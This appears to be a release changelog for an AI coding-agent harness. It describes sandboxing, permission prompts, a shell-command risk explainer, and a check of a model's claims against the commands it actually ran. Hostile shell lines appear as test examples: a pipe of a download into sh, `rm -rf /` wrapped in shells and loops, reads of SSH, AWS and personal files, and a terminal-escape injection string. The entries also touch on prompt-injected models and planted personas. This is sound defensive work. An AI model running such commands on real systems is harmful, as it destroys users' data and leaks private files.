  - **What this deliberately does not do.** Reasoning is still captured into the transcript and never printed, and the plan/stage structure introduced in v0.4.0 is untouched. The argument there — that a raw reasoning stream arrives faster than anyone can read and cannot be held still — is unaffected by how the bytes arrive.

- **The reply is drawn as it arrives, in the zone that gets erased (`kyklos.py`, `ui.py`, `DESIGN.md`, tests):** `collect_stream` takes an `on_content` sink, `_complete` feeds it an `answer_delta` emit for the turn call (never for a compaction summary — the conversation's own bookkeeping does not belong where its answer goes), and the UI buffers it into the live zone. The v0.4.0 position survives intact, because it was an argument about *reasoning*: a raw reasoning stream arrives faster than anyone can read and cannot be held still, which is why the plan tool exists. A final answer is prose meant to be read top to bottom, and the only alternative on offer was a spinner.
  - **Transient is what makes it safe.** Deltas are the one thing that escapes the buffer-then-commit rule, and they can, because the live zone is erased rather than scrolled: a retried reply redraws instead of appending, and the partial from a connection that died at 90% is simply wiped. A test pins the ugly case — a stream that dies after `Half an ans` emits those deltas, and appending them to scrollback would have read `Half an ansWhole answer.`
  - **Plain text, a tail, and an admitted cut.** Markdown is not rendered mid-stream: half an answer is half a document, and an unclosed fence would reflow the zone on every chunk. Only the last 8 lines are shown, with a `…` when earlier ones have gone, because the zone must stay shorter than the terminal — the same reason the plan band shows one step and not six. The spinner's word changes from `thinking` to `answering` once text is arriving, since by then it isn't thinking.
  - **Reasoning still isn't drawn.** The sink is called for `content` only. `reasoning_content` continues to land in the transcript unprinted.

## v0.4.0 — Enforced Boundaries (2026-11-07)

The theme of this release is Kyklos trusting less of what it used to take on faith. The model's own account of a command, a model file's claim about who the agent is, the filesystem outside the workspace, and the conversation's own growth were each taken at their word somewhere in v0.3.0; each is now checked, denied, or capped. Alongside that, one `.env` can describe several providers and switch between them without a restart, a persona can be chosen per session, and the system prompt arrives already knowing what is in the workspace and which commands the machine has.

The sandbox change is the one to read first if you read only one: approving a single network command used to leave every other repository on the machine, `~/Documents` and `~/Downloads` readable to that command, and reads are how data leaves.

- **Personas: a chosen prompt layer, read only from `KYKLOS_HOME` (`kyklos.py`, `.env.example`, `README.md`, tests):** the motivating case was porting an existing pair of engineering personas (a Chief Engineer, a Code Auditor) onto Kyklos, and the obvious route is a dead end worth recording. An Ollama `Modelfile` `SYSTEM` block is a *default* system prompt, used only when the request carries none; Kyklos always carries one. Verified against Ollama 0.40.14 on the same `/v1/chat/completions` endpoint: with no client system message a probe model answered `ZORBLAX Hi there!`, and with one it answered `AGENT Hi there!` — the baked persona replaced, silently, no error. A persona built with `ollama create` and run through any agent harness is therefore discarded while appearing to work, which is why it travels as a file here and not as a model.
  - **It is a prompt section, so switching is free.** `persona_instructions(name, home)` is the third instruction loader, in the shape of the two already there, and `set_persona` rebuilds `messages[0]` the way `set_plan_mode` does: the conversation carries over untouched and the model reads the new prompt on the next request. `--persona` for one run, `/persona` to pick or switch (remembered per profile), `KYKLOS_PERSONA` in `.env`, in that precedence.
  - **`KYKLOS_HOME` only, never the workspace.** `AGENTS.md` and `GUARDRAILS.md` are workspace files and sit behind the folder-trust gate for exactly that reason. A persona needs no gate because it is the user's own configuration — but the same property makes a workspace the one place it must not be readable from: a persona redefines who the agent is, so a clone that could name its own would be handing that decision to whoever wrote the commit. `persona_path` rejects any name that is not a bare filename, and a test plants `personas/evil.md` in the workspace and asserts it cannot be reached.
  - **Bracketed by the harness's own rules.** The section goes in *before* the guardrails and `AGENTS.md`, so a persona is never the last word in the prompt, and `test_harness_rules_still_bracket_the_persona` pins the ordering rather than trusting it. Depth 0 only, for the same reason the repo map is: a subagent is given one focused charter, and an identity layer it did not ask for would dilute it and be re-sent on every one of its steps.
  - **The cost is stated because it is paid on every step.** Each of the two personas is ~3,100 tokens, re-sent with the whole conversation on every model call — on a 32k local window that is ~10% of the budget before the first message. The `/persona` picker shows each one's approximate token count next to its name for that reason, and a name with no file reports itself and starts plain rather than quietly pretending.
  - **330 tests (was 317).** End-to-end against a local Ollama: `--persona chief` identified itself as the Chief Engineer, `--persona auditor` quoted its own dictum, a missing name printed the available list and continued without one. The 2.4GB model used for the check held the identity but dropped the persona's `VERDICT:` scaffold, which is a model-size limit and not a plumbing one.

- **Reading the user's own files is red, and the sandbox denies it (`kyklos.py`, `tools.py`, `README.md`, tests):** the sandbox allowlisted *writes* to the workspace but only denylisted *reads*, so everything not named as a credential store stayed readable — the other repositories on the machine, `~/.config`, `~/.gitconfig`, and on Linux the whole of `$HOME` outside the masked set. The explainer's half of it was the same shape from the other side: `~/<dotfile>` and `~/Library` were `danger`, but `~/Documents` fell through to `warn`, the level that deliberately does not gate. Measured before the change, in auto-bash mode `cat ~/Documents/taxes.pdf`, `grep -r . ~/Downloads` and `tar czf /tmp/x.tgz ~/Desktop` all ran **unprompted**.
  - **The pair that matters is a readable home folder and an open socket.** Approving any one network command removes `(deny network*)` entirely — egress is binary, not per-host — so a single approved `pip install` gave a command full network *and* a readable `~/other-client-repo`. Each step looks individually approved, which is why this was worth closing at the kernel rather than in the prompt.
  - **Seven folders, at both layers.** `PERSONAL_DATA_DIRS` (Documents, Desktop, Downloads, Pictures, Movies, Videos, Music — both spellings of the video folder, since macOS ships Movies and the XDG desktops ship Videos) are now `danger` in `_is_sensitive_host_path`, so they gate in auto-bash mode and withhold the `p`/`a` rule; and `SANDBOX_PROTECTED_PERSONAL_DIRS` denies them in Seatbelt and masks them with tmpfs under bwrap, so an approved command cannot read them either.
  - **A repository under `~/Desktop` is the ordinary layout, not the exception** — it is where this one lives — so the naive version of this change would have made every read in the project stop for approval, and a gate that stops everything is a mode nobody leaves on. The gate is therefore on *leaving the workspace*, never on the folder's name: every branch of `_is_sensitive_host_path` is now conditioned on `_outside_workspace`, which also fixes the pre-existing case of a workspace inside `~/.config`.
  - **Order is the whole mechanism in both backends.** SBPL takes the last matching rule (which the blanket `(deny file-write*)` already relied on), so the profile denies the personal folders, allows the workspace back, then denies credentials last — strictly stronger than before, because credentials now beat even a workspace that contains them, as the home folder trusted for one session does. bwrap applies mounts in sequence, so the tmpfs goes down *before* the workspace bind and the bind lands on top of it; the other way round would have shadowed the workspace itself. Verified live on a workspace inside `~/Desktop`: its own files readable, a sibling project on the same Desktop blocked, `~/Documents` and `~/.ssh` blocked, writes and the `AGENTS.md` write-protection unchanged.
  - **`_outside_workspace` reads `/` and `~` but not `$HOME`.** Found by the existing suite, not by inspection: adding the workspace condition made `cat "$HOME/.aws/config"` answer "inside the workspace" and stop being flagged at all — a hardening change that quietly un-hardened the case it was modelled on. The spelling is normalised to `~/` before the check.
  - **The colour doctrine was already bent, and is now written down.** Red had meant "changes something outside the conversation", yet a `~/.ssh` read has been red since the host-path rule landed. Principle: levels drifted once before by being bent one rule at a time, so rather than bend it again silently, `test_the_colours_mean_one_thing` now states the operative line — red is *changes something outside the conversation, or reads data that must not leave the machine*; warning is *reads somewhere you might not expect but a project legitimately reaches* — and pins five private reads alongside the three generic ones. The second half is not a softening of the first: output goes to the model and then to the provider, so reading `~/Documents` **is** the data leaving, and there is no later step to catch it at.
  - **307 tests (was 302), and the audit holds at 0/250 miscalibrated, 0/259 claims** — the benign corpus gained no false positives, and `ls -la /tmp/x` and `cd /srv/app && grep -rn foo src` still run unprompted, which is the direction this change could most easily have broken.
  - Still open, and deliberately not touched here: egress remains all-or-nothing once approved (the host is already extracted for the finding and then discarded), Windows has no sandbox at all so these are prompt-level only there, and reads outside `$HOME` — `/opt`, another user's folder — are still a denylist rather than an allowlist.

- **A failed API call says which failure it was (`kyklos.py`, `ui.py`, tests):** a real session against Ollama cloud showed `API error: Connection error.` four times, twice recovering on the first retry and once exhausting all three. The line could not be acted on, because `APIConnectionError` stringifies to that same constant whatever happened underneath — and `_emit("retry", error=str(e))` kept only the constant. Measured against the real SDK, the causes it was dropping are `ConnectError: [Errno 8] nodename nor servname provided` (DNS), `ConnectError: [Errno 61] Connection refused` (nothing listening) and `ReadError: [Errno 54] Connection reset by peer` (the server hung up mid-reply): three different problems with three different fixes, printed identically.
  - **The chain is what names the fault, so up to two links of it are kept.** A DNS failure hides two levels down — the httpx error says only that it could not connect, and the errno beneath it says why. The walk stops at two, guards against a cycle (a formatter reached only on the failure path is a bad place to hang, since the hang would look like the outage it was describing) and falls back to the class name for an exception carrying no message. The retry line's truncation went from 120 to 200 characters, since cutting the cause off would defeat the change.
  - **What the error class already rules out.** The SDK raises `APITimeoutError` ("Request timed out.") for its own timeouts and `APIConnectionError` for everything else at transport level, so a log that says "Connection error." has established that the client's 600s patience never ran out and the far end closed first. What it could not establish, until now, is which far end and why.
  - **Three things found while tracing, not fixed here.** `OpenAI(base_url=…, api_key=…)` passes no `timeout` and no `max_retries`, so the client inherits `connect=5s, read=600s` and the SDK's own **2** internal retries — each `[1/3]` is already the SDK's third HTTP attempt, and an exhausted `✗` is nine requests, not three. Nothing streams, so a non-streaming call carries zero bytes for the whole generation and an upstream limit sees a silent connection. And a probe of `ollama.com` (fronted by `server: Google Frontend`) found an idle connection alive at 70s and **closed by the peer at 150s**, which is shorter than the gaps Kyklos leaves between calls while a command runs or a user types — the pooled-socket reading of the recoverable failures.

- **The model's intent reaches the user as structure, not prose (`tools.py`, `kyklos.py`, `ui.py`, tests):** a reasoning model's own account of what it is doing is either a raw token stream, arriving far faster than anyone can read it, or a summary the provider makes server-side and out of reach. Neither is something a harness can restructure. What reads as staged thinking elsewhere is mostly not thinking at all — it is tool calls, a plan and a step list, each arriving as a discrete event that can simply be drawn. Kyklos already captured `reasoning_content` into the transcript without printing it, which was the right instinct; what was missing was the structure to show in its place. A `plan` tool now carries it.
  - **Linear steps, so one index is the whole state.** `plan(steps=[...])` posts the list and `plan(active=2)` moves within it; everything before `active` is done, everything after is pending, and there is no per-step status to drift out of sync. `active: 0` means finished. Validation runs before the assignment, so a refused call leaves the user looking at the step the model last actually claimed, not one it was rejected for.
  - **The event carries the resolved plan, not the call's arguments.** `plan(active=3)` says nothing about the steps, so a UI reading the arguments would have to remember them — a second copy of state that can disagree with the first. The tool returns the whole list to the model for the same reason: a step nobody marked done must not drift into looking done later in the conversation.
  - **The stage stays put while the work moves.** A new or changed plan prints in full, with the active step marked; finishing one prints a single row, because reprinting six steps per advance would bury the work those steps describe. The active step also sits in the live zone, above the tool rows that scroll past it — which is the entire point, since a stream of reasoning cannot be held still like that.
  - **It writes nothing, so it asks nothing, and it is not counted as work.** `plan` joins `SAFE_TOOLS`: a permission prompt before showing the user a list would be friction with nothing behind it. It is left out of the turn's tool tally and draws no ordinary tool row, since the band already said everything the row would — but a *failed* plan call keeps its row, so a rejected one is never silent. Plan mode gains it too; subagents do not, having one focused job whose steps would draw inside a tree the user cannot act on.
  - **A step is model-written text on its way to a terminal.** Found by probing the new path rather than reasoning about it: `plan(steps=["safe\x1b[31m\x07 and \x1b]0;pwned\x07nasty"])` reached the screen with its escapes intact — Rich drops a bare BEL and passes CSI and OSC straight through, so a step could recolour the screen, set the window title, or leave an unterminated OSC that swallows whatever printed next. Whole sequences are stripped at the one place that decides what a step says, rather than at each place that draws it; stripping the ESC byte alone would have left `[31m` behind as literal rubbish. A step that was nothing but escapes is refused, because it says nothing. 293 tests (was 272); the audit holds at 0/250 miscalibrated and 0/259 claims.

- **A recognised program is not a safe one (`kyklos.py`, `audit.py`, tests):** being in `PLAIN_CMDS` means only that Kyklos knows the name, so these never went `opaque` — and, with no rule of their own, produced nothing at all. `sed -i` was the clearest: it rewrites a file in place and read exactly like `sed -n '1,5p'`. On a 36-command probe of destructive shapes, **13 ran unprompted, then 11, now 0**.
  - **Eleven rules, each for a program already in the list.** `sed -i` rewrites in place; `ln -f` replaces its destination; `cp /dev/null x` empties a file; `chown -R` mirrors the `chmod` rule that was already there; `npm publish` cannot be taken back; `git checkout -- .`, `git restore` and `git branch -D` lose work, and `git config --global` changes settings outside the repository. A bare `rm` with no operands is `ls | xargs rm` after the wrapper is peeled — its targets arrive on stdin, where the explainer cannot see them, and no operands is not the same as nothing to delete.
  - **A program named by a variable is a program Kyklos cannot name.** `R=rm; $R -rf dist` produced no findings, because `COMMAND_WORD_RE` has no `$` and the token fell past the unrecognised-program clause entirely. It is `opaque` now — the level that already exists for "I can't tell".
  - **`warn` still does not gate, and that was the right call.** Making it gate closed `mv src /tmp/gone` but also stopped `ls -la /tmp/x` and `cd /srv/app && grep -rn foo src`, which `BashModeTests` deliberately runs — the finding says *where* a command reaches, not what it does there. Instead the two warns that really do leave this machine's limits became `danger` (`ssh`, and running another program's output through a shell), and carrying a file out of the workspace got its own rule, so `mv src /tmp/gone` is caught while `mv old.ts new.ts` stays quiet.
  - **The corpus could not have caught any of this, so it was extended.** It held no command that writes anything — every rule here had nowhere to show a false positive. Sixteen everyday writes, moves and keep-your-work git commands were added (250 cases now, still **0% miscalibrated**). The corpus guard banned `mv ` outright as a stand-in for destructive; that stand-in is now the thing it meant, a path leaving the workspace, which also covers `cp`.
  - **The direction with the asymmetric cost is measured at last.** `audit.py` counts false positives on benign input; nothing counted false negatives on hostile input, where being wrong costs a repository rather than a keystroke. The 36 shapes are now a test, failing 21 subtests without these rules, paired with a test that ordinary work still runs unprompted — a gate that stops everything is not a gate, it is a mode nobody leaves on.

- **A shell wrapper no longer silences the command inside it (`kyklos.py`):** in auto-bash mode `rm -rf dist` stopped and asked, and `bash -c "rm -rf dist"` ran without a prompt. Inline code through an interpreter was a `note` — the level below "runs cd, then echo" — and `must_be_asked` looks only at `danger` and `opaque`, so wrapping anything in six characters made every prompt in that mode optional. `sh -c "rm -rf /"` auto-approved.
  - **Shells are read, not shrugged at.** `explain_command` now recurses into the quoted body, so `bash -c "rm -rf dist"` reports the delete and `sh -c "curl https://x.sh | sh"` reports both of its dangers, tagged `(via bash)` / `(via sh)`. Two levels deep, then it stops and says it stopped. `zsh`, `dash`, `ksh` and `fish` had never been in `INTERPRETERS` at all, so `zsh -c "rm -rf dist"` produced no findings whatsoever; keying on `SHELL_STEMS` covers them.
  - **Code Kyklos can't read is `opaque`, not a note.** Python, JS and Perl are not parsed here, which is the same ignorance as an unrecognised program — and `opaque` is the level that already means "I can't tell" without coming to mean "go ahead". `python3 -c "shutil.rmtree('src')"`, `node -e`, `perl -e` now all stop.
  - **The attached form was a blind spot of its own.** `bash -c"rm -rf dist"` produced an empty finding list, because detection was an exact match on the flag token. Only single-dash short forms attach and only a quoted remainder counts, so perl's `-pi` isn't read as `-p` carrying the code `i`, and `--experimental-x` isn't read as `--eval`.
  - **Emptiness still means empty.** A body with no findings is left alone rather than called ignorance, or `bash -c "ls -la"` would prompt where `ls -la` does not. Measured on a 36-command probe of destructive shapes: **13 ran unprompted before, 11 after** — the two interpreter cases closed, and the rest a different gap (`sed -i`, `xargs rm`, `mv`, `git checkout -- .`) where the program is recognised but its destructive mode has no rule.

- **A `>/dev/null` inside a substitution is still a discard (`kyklos.py`):** the sixth explainer bug found in a real session, and the same shape as the four before it. `REDIRECT_RE` runs its target to the next space, so the `)` closing a `$(…)` came along with the filename: `pid=$(cat f.json 2>/dev/null)` gave `/dev/null)`, which is not one of the `NULL_SINKS`, and a read-only probe was announced in red as `overwrites /dev/null)`. The identical `>/dev/null` later in the same command, outside any substitution, stayed correctly silent — both behaviours visible side by side in one prompt.
  - **The trimming already existed one function away.** `_bare` drops an unbalanced trailing `)` so that `(cd sub && rm -rf dist)` deletes `dist` rather than `dist)`; the operand path got it and the redirect path never did. Balance is what decides, so a filename entitled to a paren of its own — `echo hi > backup(2)` — keeps it, and the write a substitution really is hiding, `X=$(cat f > /etc/hosts)`, is still found.

- **The system prompt names the commands this machine doesn't have (`tools.py`, `kyklos.py`):** the check existed but ran only on Windows, where it covers the unix text tools PowerShell has no answer for. The mirror-image gap was never covered: macOS ships a BSD userland, so none of the GNU coreutils extras are there, and a model trained mostly on Linux assumes they are.
  - **`timeout` is the one that costs real time.** Bounding a command that might hang is exactly the right instinct and the first thing reached for — and it does not exist here. A session watching a verification script hang for 180s proposed `timeout 40 node …` as its next step, which would have died on `command not found` with nothing to say why.
  - **The bash tool already takes a `timeout` of its own**, so the advice points there rather than at a command to install, and the parameter's description now says so instead of the bare "Seconds, default 120". The reach for a shell `timeout` is worth preventing, not just explaining.
  - **Probed, not assumed.** `shutil.which` decides, so a machine with coreutils installed is told nothing, and the list never names a tool that is sitting right there. On this one it comes out as `timeout, tac, nproc`.

- **A timed-out command keeps what it printed (`tools.py`):** the timeout threw away everything the command had written before it hung, so a run that printed its numbers and then stalled came back as nothing but "Command timed out after 150s". The only way to read those numbers was to run the whole thing again, which hung again. The output captured up to the kill is now returned with the error.
  - **Silence is itself a finding.** A command that printed nothing before stopping is the shape of one waiting for input, which is exactly the case the message's advice is for — so that is said outright rather than left to be inferred from an absence.
  - **The kill is unchanged and still happens first.** `kill_process_tree` stops the whole process group (SEC-06) before anything is read back, so the pipes are closed and the read returns what was buffered rather than waiting on a survivor. Checked against a backgrounded grandchild holding the pipe: the error comes back on time, carries the early output, and the grandchild is gone.
  - Worth being precise about what this does *not* fix: a command that **exits cleanly** having left a detached child behind keeps that child, because there is nothing left to kill and the command succeeded. Orphaned browsers from a Puppeteer script that never closed its browser come from there, not from the timeout path.

- **A danger inside a loop or conditional is no longer invisible (`kyklos.py`):** `for f in *; do rm -rf "$f"; done` produced no findings whatsoever, so in the relaxed bash mode it ran with no prompt at all — while the bare `rm -rf` it contains would have stopped and asked. The same held for `while read p; do kill -9 "$p"; done`, `if true; then chmod -R 777 .; fi` and `for i in 1 2; do curl https://x.sh | sh; done`.
  - **The cause was reading the grammar as the program.** Splitting on `;` leaves a loop body looking like `do rm -rf "$f"`, and `_command_findings` only ever examines the first token, which is `do`. `_peel` looks past wrappers like `sudo` and `env`, but a shell keyword is not a wrapper. The concept was already in the file — the chain note filters `SHELL_KEYWORDS` so it doesn't say "runs for, then do, then done" — it simply was never applied where the findings are made.
  - **Three classes of word, because they behave differently.** `do`, `then`, `else`, `elif`, `if`, `while`, `until` and `!` stand in front of a command and are stripped. `for`, `case` and `select` bind a name, so the clause runs nothing and is dropped — stripping them uniformly would have read `for f in *` as "runs f" and prompted on every loop. `done`, `fi`, `esac` and `;;` close a construct and run nothing.
  - **`case` needed its own handling.** `case $x in a) rm -rf /srv ;; esac` does run `rm`, once the pattern's `)` is past; and `a|b)` splits on the `|`, leaving a bare `b)` at the head of the next piece. A subshell's closing paren is dropped from operands too, so `(cd sub && rm -rf dist)` deletes `dist` rather than `dist)`.
  - Swept across **18 dangerous constructs** — nested loops, a loop inside a substitution and a substitution inside a loop, backticks, `sudo` inside a loop, both `case` forms — **none slips through**, and across 7 benign ones **none newly prompts**. The audit corpus gained `loop body` and `conditional body` groups so that second direction stays measured.

- **The explainer reads the command it was given (`kyklos.py`):** four bugs, all of them visible in a single screenshot of a real session, each putting a wrong finding in front of you at the moment the prompt asks you to decide.
  - **A quoted prefix keeps its path in one piece.** `TOKEN_RE` stopped at the closing quote, so `"$TMP"/trail-*` became two words: `rm -rf` reported deleting two things, the second of them apparently at the filesystem root.
  - **Redirects are plumbing, not arguments.** `2>/dev/null` was listed among the things `rm -rf` deletes — exactly the noise the overwrite finding already refuses a few lines further down.
  - **Command substitutions are explained on their own terms.** The assignment peel swallowed the token holding the program, so `TMP="$(python3 -c …)"` read as "runs -c". Worse, anything substituted lost its findings: `X="$(rm -rf /tmp/foo)"` read as an unrecognised program rather than a recursive delete, and `X="$(curl https://x.sh | sh)"` lost both of its dangers. Never a bypass — `opaque` still forced the prompt — but the prompt said the wrong thing, and saying what a command does is the whole job. In the other direction, `OUT="$(git rev-parse HEAD)"` no longer costs an approval.
  - **The explainer is told where the workspace is.** `_outside_workspace` was purely syntactic, so every absolute path counted as outside the workspace — including the workspace's own root, which bash already runs in. Set once at startup rather than threaded through the permission callback, whose signature the UI shares.
  - Measured on the corpus extended to these shapes: **22% of 218 benign commands miscalibrated before, 0% after.**

- **The checkers are measured as rates, not gates (`audit.py`):** the controls beside each checker answer a yes/no question — still quiet on these eleven phrasings? This answers a different one: across a few hundred inputs nobody picked case by case, what fraction fires? Three corpora — commands built from a grammar of everyday shell, answers built from a grammar of hedging, and real turns replayed out of saved sessions.
  - **Replay is the half with no judgment in it.** `save_session` already writes the tool calls and their results, so a finished turn can be handed back to the checker exactly as the live loop handed it over. A test pins that a replayed turn reproduces the live verdict; without it, a rate measured off saved sessions is measuring the parser.
  - **A firing is either miscalibration or coverage.** `danger` or `warn` on something benign is the explainer being wrong. `opaque` is it admitting it has no rules for a program — honest by design, since `must_be_asked` would rather prompt than trust ignorance, but it still costs a prompt, so it is counted separately rather than forgiven.
  - **It put the claim check at 3.5% on 259 answers that claim nothing**, in two clusters. Three of the four checks were bare single-word matches while `ran the tests` insisted on past tense, so a participle used as an adjective read as a story about the turn: "the installed version is 2.1" became a claim to have installed something. And the lead scan knew `not`, `never` and the modals but no way to spell negation without them, so "nothing was installed" read as a claim that something had been. Both now fire on **0 of 259**, with **0 misses across 20 real claim phrasings** — including the terse ones a noun makes, like "changes committed".

- **A workspace sketch in the system prompt (`tools.py`, `kyklos.py`):** `repository_map` lists the project's source files and what each defines, so turn one doesn't start blind. A diagnosed session spent **134 exploratory calls, 87% of all its tool output**, much of it discovering what exists. `/map` shows the current sketch.
  - **Names only — no signatures, no line numbers.** The same evidence that shaped the command explainer applies: a regex over code produces confident nonsense, and it would do it here on TS/JS/Go/Rust parameter lists. A map that misstates a signature is worse than no map, because the model believes it. Python goes through the real `ast`, so an unparseable file contributes nothing rather than guesses. Line numbers are the first thing to go stale after an edit, so they're left out.
  - **Capped by rendered length per file, not by entry count** — one entry can be a class that expands to ten method names, so counting entries let a file of classes spend the entire budget and leave the rest of the tree invisible. Shallow paths come first, since a truncated map should keep the entry points rather than whatever sorts first alphabetically. ~340 tokens for this repository.
  - It lives in the system prompt for the same reason `AGENTS.md` does, and is regenerated at the start of any turn following one that wrote files, so it's never stale at the moment the model reads it. Subagents don't get it; they're given one focused job. The text says it's generated and to read a file before relying on it.

- **A scratch directory inside the workspace (`tools.py`, `kyklos.py`):** `.kyklos/scratch/` for throwaway diagnostic scripts. `_resolve` refuses to write outside the workspace, so a model wanting to check a runtime value had no path open to it but `cat > /tmp/x.mjs <<'EOF'` through bash — and nothing in `/tmp` can resolve `./src/...` or the project's dependencies. Real sessions show exactly that: `/tmp/probe.mjs`, `/tmp/verify.mjs`, `/tmp/fake-ollama.mjs`.
  - Promoting overwrites to red had made this worse: writing the script was a danger finding and running it an opaque one, so a five-line diagnostic cost two prompts. Writing to scratch now needs no approval and the explainer passes over it, since the directory exists to be written over.
  - **Running a scratch script still asks.** `bash` isn't confined to a directory, and a script the model wrote moments ago is the clearest case of "contents you want to look at first". The gain is one prompt per debug cycle rather than two, not zero — auto-approving the execution of code the model just wrote would hand away the thing the permission gate is for.
  - It keeps itself out of git with a `.kyklos/.gitignore` containing `*`, rather than editing the project's own `.gitignore`.

- **The answer's story is checked against the turn (`kyklos.py`, `ui.py`):** when an answer claims it ran the tests, committed, pushed or installed something, `unsupported_claims` compares that against the commands the turn actually ran, and shows the user where they disagree. A harness can't make a model truthful, but in a coding agent the untruths are about checkable things — `edit_file` already turns one class of them into a hard failure by demanding the exact existing text, so a model that imagines a file can't edit it. This extends that to the turn's own account of itself.
  - **Succeeding counts, not just running.** A `pytest` that exited 1, or one that was denied and so has no exit code at all, doesn't support "the tests pass" — the more damaging claim, and the one a naive "did a test command appear?" check would miss.
  - **It errs towards silence.** Only past-tense assertions count, so advice ("run the tests before you push"), hedging ("I haven't run the tests yet") and conditionals ("if you push, CI will run the tests") stay quiet. Measured at 0 false positives across 14 such phrasings and 0 misses across 9 real claims; a check that cries wolf gets ignored.
  - Reported to **you, never to the model**, and worded as a mismatch rather than a verdict, since the claim may be about an earlier turn. Like the command explainer, the harness derives a fact and shows where it differs from what was claimed, instead of asking the model to mark its own work.

- **A bash approval mode is chosen at startup (`kyklos.py`, `ui.py`):** after the trust question, Kyklos asks whether to ask for every bash command (the default) or to run the unflagged ones unprompted and stop only for the rest.
  - **What still asks in the relaxed mode:** red findings, secret files, and anything `opaque` — a program Kyklos has no rules for, or a script whose contents it can't see. Those last two are the explainer admitting it doesn't know, and a mode that ran them unasked would be treating ignorance as evidence of safety. Unknown findings got their own level for this, rendered like a note but never auto-approved.
  - **The levels were given one meaning.** Red means a command changes something outside the conversation; a warning means it reads somewhere you might not expect. The rules had drifted from that: **overwrites (`>`, `>>`, `tee`), network access (`curl`, `wget`, `git push/pull/clone/fetch`), package installs, a plain non-recursive `rm`, `find -delete`/`-exec`, `pkill`/`kill` and `chmod -R`** were all promoted from warnings to fit it. The drift was the real bug — `find . -delete` ran unprompted while `rm old.txt` stopped, so the command that could remove a thousand files was the one that didn't ask. A test now pins the line across nineteen changing and three reading commands, so a future rule can't quietly disagree with it.
  - Stopping on *all* warnings was considered and rejected on evidence: in a real session **94% of bash commands were `warn`**, nearly all from "touches … outside the workspace" firing on any absolute path, so that bar would have auto-approved nothing and made the mode pointless. With the promotion, 89% of that session's commands still run unprompted and 11% stop.
  - **Side effect in the default mode:** a danger finding withholds both `p prefix` and `a always`, so a rule can no longer be saved for a promoted command — no "always allow `npm install`". That is consistent with treating them as red, but it is a change to the ask-every-time mode, not only the new one.
  - The choice is **never remembered**, unlike folder trust: it relaxes rules that protect every run, so it's agreed once per session. `write_file` and `edit_file` are untouched, no keyboard means ask, and the status bar carries `bash: unflagged runs` while it's on.
  - This promotes the explainer from an aid to reading into something approvals depend on, which the docs now say plainly, caveat and all — the startup panel itself says unflagged does not mean proven safe.

- **Subagent delegation is prompted where it matters (`kyklos.py`):** the same diagnosed session made **134 exploratory tool calls — 87% of all its tool output — and used `task` zero times out of 277 calls**. The subagent exists precisely so a long search costs the main conversation one result instead of every file read, so this was the feature working as designed and never being reached for.
  - The static instruction said "for broad searches… delegate", which is too vague to act on. It now gives a threshold and the reason: every step re-sends the whole conversation, so anything taking more than two or three reads should be delegated.
  - A one-off note is appended to a tool result once the conversation passes half the compaction trigger, naming the current size. The model can see the files it read but not the cost of carrying them on every later step; this supplies the missing signal at the moment it applies. It fires once per turn, never when `task` isn't available, and stays silent on short turns — following the same convention as the existing redaction note.

- **Compaction has an absolute ceiling (`kyklos.py`, `ui.py`):** `COMPACT_ABOVE` (100k by default, settable in `.env`) caps how large a conversation may grow before Kyklos prunes it, whatever the context window. `COMPACT_AT` alone is a *fraction of the window*, so a 1M-token model wouldn't compact until 750k — and a real session diagnosed from its saved JSONL compacted **zero times across 30.8M billed tokens**, because its conversation peaked at 178k, only 17% of the window.
  - Every step re-sends the whole conversation, so cost is set by how much context each step carries, not by how much window is spare: that session's 234 calls averaged 118k tokens each, and prompt re-sending alone accounts for 90% of the bill. The perverse consequence was that declaring a *larger* window made the session more expensive, because it pushed the pruning threshold further away.
  - `compaction_trigger()` is `min(window × COMPACT_AT, COMPACT_ABOVE)`, and `compaction_budget()` is derived from the trigger rather than the window — otherwise compaction fires and then keeps everything, since 20% of a 1M window is larger than the conversation that set it off.
  - Replaying that real session: capping at 100k would have cut prompt tokens **39%** (27.7M → 16.8M) with three compactions; 60k saves 51%, 150k saves 17%. Windows of 128k and below behave exactly as before.
  - `/tokens` reports the real trigger and says when it's `COMPACT_ABOVE` rather than the window doing the limiting.

## v0.3.0 — Readable Permissions (2026-10-25)

You shouldn't have to parse a shell command in your head to answer `y` or `n`. Kyklos now says what a command would do before you decide, and when a turn runs out of steps it says what it managed and how to carry on.

- **The step cap is configurable and explains itself (`kyklos.py`):** `MAX_STEPS` can be set in `.env` (default 50, validated like `CONTEXT_WINDOW`), carried on the `Agent` and inherited by subagents. Reaching it used to print `(Stopped after 50 steps without a final answer.)` and nothing else, which reads like a failure and gives you nowhere to go. It now reports what the turn managed and how to carry on:
  ```
  (Stopped after 50 steps: 55 tool calls, 2 files changed (a.ts, b.ts). The conversation is
   kept — send "continue" to carry on, /undo to revert this turn, or raise MAX_STEPS in .env.)
  ```
  The cap is a budget, not an error: the conversation is untouched, so `continue` resumes mid-task. Worth knowing that a capped turn ends with no final answer and so adds no `turn_log` entry, though its messages remain.

- **Permission prompts explain the command (`kyklos.py`, `ui.py`):** `explain_command` turns a shell command into plain-language findings at three levels — `danger`, `warn`, `note` — shown in the panel under the `$ command`, worst first, so you aren't choosing `y` or `n` from the raw text alone. It recognises piping a download into a shell, recursive deletes, `sudo`, force-pushes, `reset --hard`, raw-device writes, world-writable `chmod`, redirects, network calls, package installs, `find -delete`, process kills, paths outside the workspace, interpreters running inline code, and programs it doesn't know (which it says plainly).
  - **The harness derives the explanation; the model is never asked.** The permission prompt exists because the model may propose something you didn't intend, so letting it narrate its own command would put the thing being checked in charge of the check — and a model steered by injected text would describe exactly the command you should refuse as routine. It also costs no API call at the moment you're waiting.
  - **Findings gate the options, not just the text.** Any `danger` finding now withholds `p` and `a` and turns the border coral, extending to all destructive commands the rule that previously applied only to secret files. `apply_permission_answer` takes a `danger` flag; `permission_options` returns the findings so both front ends show and enforce the same thing.
  - **Quote-aware parsing**, from a real command that broke all of it: `_split_top_level` splits on `&&`, `||`, `;` and `|` only outside quotes, so `grep -n "hasKey\|serverKeys\|verify" f.ts` is one command with one argument, not a four-stage pipeline running a program called `serverKeys`. `_unquoted` blanks quoted spans before the redirect scan, so `echo "a > b"` writes nothing.
  - **A wrapper can no longer silence the command it runs.** `env X=1 rm -rf build` produced *no findings at all*, and `sudo rm -rf /srv` reported the escalation but never the delete — silence being far worse than noise, since an empty panel reads as "nothing to see". `_peel` now looks past leading `VAR=value` assignments and wrappers (`env`, `sudo`, `time`, `timeout`, `nohup`, `nice`, `xargs`, `exec`, …), and each layer is examined, so `sudo rm -rf /srv` reports both.
